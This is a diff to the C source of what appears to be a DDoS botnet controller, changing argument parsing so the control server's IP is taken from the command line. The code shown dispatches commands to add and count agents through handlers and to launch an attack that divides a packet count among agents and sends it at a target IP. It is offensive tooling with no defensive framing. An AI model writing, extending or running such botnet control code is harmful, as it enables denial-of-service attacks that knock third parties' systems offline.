@@ -90,23 +90,24 @@ static int print_usage(cmd_t cmd)
     return 1;
 }
 
-static cmd_t parse_args(int argc, char *argv[])
+static cmd_t parse_args(int argc, char *argv[], char **ip)
 {
     cmd_t i;
 
-    if (argc < 2)
+    if (argc < 3)
     {
         i = CMD_NUMBER;
         goto Exit;
     }
+    *ip = argv[1];
 
     for (i = 0; i < CMD_NUMBER; i++)
     {
-        if (!strcmp(argv[1], commands[i].cmd) &&
-                (strlen(argv[1]) == strlen(commands[i].cmd)))
+        if (!strcmp(argv[2], commands[i].cmd) &&
+                (strlen(argv[2]) == strlen(commands[i].cmd)))
         {
             /* Command was found, checking parametres */
-            if ((argc - 2) < commands[i].args)
+            if ((argc - 3) < commands[i].args)
             {
                 /* The number of passed arguments is invalid */
                 print_usage(i);
@@ -356,33 +357,34 @@ int main(int argc, char *argv[])
     cmd_t cmd;
     int rv = 0, sock, agents = 0, pkts;
     attack_data_t attack_data;
+    char *ip = NULL;
 
-    cmd = parse_args(argc, argv);
+    cmd = parse_args(argc, argv, &ip);
     if (cmd == ERROR)
         return 1;
 
-    sock = create_socket(DDOS_CTRL_CLT_PORT, 1000); 
+    sock = create_socket(ip, DDOS_CTRL_CLT_PORT, 1000); 
     if (sock == ERROR)
         return 1;
 
     switch (cmd)
     {
         case CMD_ADD_AGENT:
-            rv = ddns_add_agent(sock, argv[2], argv[3]);
+            rv = ddns_add_agent(sock, argv[3], argv[4]);
             break;
         case CMD_INTERROGATE_HANDLERS:
-            rv = for_each_handler(sock, argv[2], interrograte_hanler, NULL);
+            rv = for_each_handler(sock, argv[3], interrograte_hanler, NULL);
             break;
         case CMD_VALIDATE_AGENTS:
-            rv = for_each_handler(sock, argv[2], validate_agents, NULL);
+            rv = for_each_handler(sock, argv[3], validate_agents, NULL);
             break;
         case CMD_COUNT_AGENTS:
-            rv = for_each_handler(sock, argv[2], count_agents, &agents);
+            rv = for_each_handler(sock, argv[3], count_agents, &agents);
 	    fprintf(stdout, "Avalible agents: %d\n", agents);
             break;
         case CMD_ATTACK:
-            pkts = (argc > 4) ? atoi(argv[4]) : DEFAULT_PKTS_NUMBER;
-            rv = for_each_handler(sock, argv[2], count_agents, &agents);
+            pkts = (argc > 5) ? atoi(argv[5]) : DEFAULT_PKTS_NUMBER;
+            rv = for_each_handler(sock, argv[3], count_agents, &agents);
 	    if (!agents)
 	    {
 		fprintf(stdout, "No avalible agents!\n");
@@ -390,8 +392,8 @@ int main(int argc, char *argv[])
 	    }
 
             attack_data.pkts = (int)(pkts / agents);
-            attack_data.target_ip = argv[3];
-            rv = for_each_handler(sock, argv[2], attack, &attack_data);
+            attack_data.target_ip = argv[4];
+            rv = for_each_handler(sock, argv[3], attack, &attack_data);
             break;
         default:
             break;
